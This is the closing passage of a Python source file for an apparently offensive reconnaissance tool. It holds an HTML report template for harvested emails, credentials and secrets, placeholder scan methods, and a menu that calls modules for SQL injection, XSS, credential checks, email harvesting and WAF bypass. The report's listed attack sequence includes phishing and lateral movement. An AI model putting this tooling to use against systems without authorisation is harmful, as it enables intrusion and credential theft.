            margin: 20px 0;
        }}
        th, td {{
            border: 1px solid #ff0000;
            padding: 10px;
            text-align: left;
        }}
        th {{
            background: #2a2a2a;
            color: #ff0000;
        }}
        .finding {{
            background: #1a1a1a;
            padding: 10px;
            margin: 10px 0;
            border-left: 3px solid #ff0000;
        }}
        .stats {{
            display: inline-block;
            margin: 10px;
            padding: 15px;
            background: #1a1a1a;
            border: 1px solid #ff0000;
            border-radius: 5px;
        }}
        .timestamp {{ color: #888; font-size: 0.9em; }}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔴 RED TEAM ASSESSMENT REPORT</h1>
        <h2>Target: {self.target}</h2>
        <p class="timestamp">Assessment Date: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p class="timestamp">Duration: {elapsed:.2f} seconds</p>
        <p class="timestamp">Mode: {'STEALTH' if self.stealth_mode else 'AGGRESSIVE'}</p>
    </div>
    
    <h2>📊 EXECUTIVE SUMMARY</h2>
    <div>
        <div class="stats">🎯 Total Assets: {len(self.subdomains)}</div>
        <div class="stats">🌐 Alive Hosts: {len(self.alive_hosts)}</div>
        <div class="stats">💀 Vulnerabilities: {len(self.vulnerabilities)}</div>
        <div class="stats">🔑 Credentials Found: {len(self.default_creds)}</div>
        <div class="stats">☁️ Cloud Assets: {len(self.cloud_assets)}</div>
        <div class="stats">📧 Emails Harvested: {len(self.emails)}</div>
        <div class="stats">🔐 Secrets Found: {len(self.secret_keys)}</div>
    </div>
    
    <h2>🎯 CRITICAL FINDINGS</h2>
    {self._generate_findings_html(self.vulnerabilities[:10])}
    
    <h2>🔑 DEFAULT CREDENTIALS</h2>
    <table>
        <tr><th>URL</th><th>Username</th><th>Password</th></tr>
        {self._generate_creds_html(self.default_creds[:20])}
    </table>
    
    <h2>☁️ CLOUD ASSETS</h2>
    <ul>
        {''.join([f'<li class="finding">{asset}</li>' for asset in list(self.cloud_assets)[:20]])}
    </ul>
    
    <h2>📧 HARVESTED EMAILS</h2>
    <ul>
        {''.join([f'<li>{email}</li>' for email in list(self.emails)[:20]])}
    </ul>
    
    <h2>🗝️ DISCOVERED SECRETS</h2>
    <ul>
        {''.join([f'<li class="critical">{secret[:100]}</li>' for secret in list(self.secret_keys)[:10]])}
    </ul>
    
    <h2>📁 SENSITIVE FILES</h2>
    <ul>
        {''.join([f'<li class="high">{file}</li>' for file in self.sensitive_dirs[:20]])}
    </ul>
    
    <h2>🚀 RECOMMENDED ATTACK SEQUENCE</h2>
    <div class="finding">
        <ol>
            <li>Exploit default credentials on admin panels</li>
            <li>Extract secrets from exposed git repositories</li>
            <li>Test S3 bucket permissions for write access</li>
            <li>Exploit discovered XSS and SQLi vulnerabilities</li>
            <li>Use harvested emails for phishing simulation</li>
            <li>Attempt lateral movement using discovered credentials</li>
        </ol>
    </div>
    
    <div class="header">
        <p class="timestamp">Report generated by Red Team Recon Framework v2.0</p>
        <p class="timestamp">⚠️ For authorized security testing only ⚠️</p>
    </div>
</div>
</body>
</html>
'''
        
        with open(report_file, 'w') as f:
            f.write(html_content)
        
        self.print_colored(f"[+] Red Team report generated: {report_file}", "green")
        self.print_colored(f"[+] Total vulnerabilities found: {len(self.vulnerabilities)}", "red")
    
    def _generate_findings_html(self, findings):
        """Generate HTML for findings"""
        if not findings:
            return "<p>No critical findings discovered</p>"
        
        html = ""
        for finding in findings:
            html += f'<div class="finding critical">⚠️ {finding}</div>\n'
        return html
    
    def _generate_creds_html(self, creds):
        """Generate HTML for credentials table"""
        if not creds:
            return "<tr><td colspan='3'>No default credentials found</td></tr>"
        
        html = ""
        for cred in creds[:20]:
            parts = cred.split(' - ')
            if len(parts) == 2:
                url, creds_str = parts
                username, password = creds_str.split(':') if ':' in creds_str else ('', '')
                html += f'<tr><td>{url}</td><td>{username}</td><td>{password}</td></tr>\n'
        return html
    
    # Placeholder methods for existing functionality
    def enumerate_subdomains(self):
        """Subdomain enumeration (simplified)"""
        self.print_colored("[*] Enumerating subdomains...", "yellow")
        # Add your existing subdomain enumeration code here
        self.subdomains.add(self.target)
        self.subdomains.add(f"www.{self.target}")
        self.print_colored(f"[+] Found {len(self.subdomains)} subdomains", "green")
    
    def discover_alive_hosts(self):
        """Alive host discovery (simplified)"""
        self.print_colored("[*] Discovering alive hosts...", "yellow")
        for sub in self.subdomains:
            self.alive_hosts.add(f"http://{sub}")
        self.print_colored(f"[+] Found {len(self.alive_hosts)} alive hosts", "green")
    
    def port_scan(self):
        """Port scanning (simplified)"""
        self.print_colored("[*] Scanning ports...", "yellow")
        self.print_colored("[+] Port scan complete", "green")


def main():
    parser = argparse.ArgumentParser(
        description='Red Team Reconnaissance Framework - Offensive Security Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python redteam_recon.py example.com
  python redteam_recon.py example.com --stealth
  python redteam_recon.py example.com -o ./assessment
  python redteam_recon.py example.com --full-red-team
        """
    )
    
    parser.add_argument('target', help='Target domain (e.g., example.com)')
    parser.add_argument('-o', '--output', help='Output directory')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode (slower, random delays)')
    parser.add_argument('--full-red-team', action='store_true', help='Run full red team assessment')
    parser.add_argument('--quick', action='store_true', help='Quick scan mode')
    
    args = parser.parse_args()
    
    # Create framework instance
    framework = RedTeamRecon(args.target, args.output, args.stealth)
    
    # Display banner
    framework.display_banner()
    
    if args.full_red_team:
        framework.run_full_red_team_assessment()
    else:
        # Interactive menu
        while True:
            choice = input("\nSelect module (1-15): ").strip()
            
            if choice == '1':
                framework.run_full_red_team_assessment()
            elif choice == '2':
                framework.subdomain_takeover_check()
            elif choice == '3':
                framework.cloud_asset_discovery()
            elif choice == '4':
                framework.git_repo_leak_detection()
            elif choice == '5':
                framework.s3_bucket_enumeration()
            elif choice == '6':
                framework.api_endpoint_discovery()
            elif choice == '7':
                framework.xss_vulnerability_scan()
            elif choice == '8':
                framework.sql_injection_test()
            elif choice == '9':
                framework.default_credential_check()
            elif choice == '10':
                framework.cve_exploit_scanner()
            elif choice == '11':
                framework.sensitive_file_discovery()
            elif choice == '12':
                framework.email_harvesting()
            elif choice == '13':
                framework.secret_key_discovery()
            elif choice == '14':
                framework.waf_detection_bypass()
            elif choice == '15':
                framework.run_full_red_team_assessment()
            elif choice == '99':
                framework.print_colored("[*] Exiting...", "yellow")
                sys.exit(0)
            else:
                framework.print_colored("[!] Invalid choice!", "red")
    
    # Run quick scan if specified
    if args.quick:
        framework.run_full_red_team_assessment()


if __name__ == "__main__":
    # Check for root/administrator privileges warning
    if os.geteuid() == 0:
        print("\033[91m[!] Running as root - this is powerful but dangerous!\033[0m")
    
    main()
